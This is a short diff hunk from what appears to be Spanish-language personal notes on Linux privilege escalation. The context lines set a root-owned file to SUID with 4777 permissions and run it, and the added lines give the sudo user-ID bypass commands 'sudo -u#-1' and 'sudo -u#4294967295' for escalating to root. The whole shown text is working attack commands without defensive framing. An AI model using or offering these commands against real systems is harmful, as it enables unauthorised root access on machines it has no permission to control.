@@ -204,3 +204,6 @@ chown root:root archivo
 chmod 4777 archivo
 Ejecutarlo
 ----------------------------------------
+
+Elevar privs vuln de sudo
+sudo -u#-1 ID -u //// sudo -u#4294967295 ID -u
